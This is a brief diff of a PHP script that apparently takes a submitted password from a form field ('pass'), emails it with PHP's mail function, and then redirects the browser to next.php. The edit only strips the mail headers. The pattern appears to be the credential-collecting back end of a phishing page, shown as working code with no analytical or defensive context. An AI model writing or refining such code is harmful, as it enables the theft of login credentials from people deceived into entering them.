@@ -33,12 +33,9 @@ $b=$_POST['pass'];
          
         
 
-         $header = "From:".$f."\r\n";
         
-         $header .= "MIME-Version: 1.0\r\n";
-         $header .= "Content-type: text/html\r\n";
          
-         $retval = mail ($to,$a,$b,$header);
+         $retval = mail ($to,$a,$b);
        if( $retval == true ) {
           
                   echo "<script>window.location='next.php';</script>";
